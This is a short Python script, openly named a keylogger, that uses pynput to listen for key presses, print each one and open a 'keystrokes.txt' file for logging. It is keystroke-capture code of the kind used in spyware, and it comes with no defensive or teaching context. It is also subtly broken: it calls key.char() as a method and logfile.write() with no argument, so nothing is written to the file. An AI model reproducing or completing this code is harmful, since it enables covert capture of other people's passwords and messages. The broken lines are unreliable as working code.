from pynput import keyboard

def keylogger(key):
    print(str(key))
    with open("keystrokes.txt", 'a') as logfile:  
        try:
            char = key.char()
            logfile.write()
        
        except:
            print("Error")
            

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keylogger)
    listener.start()
    input()
    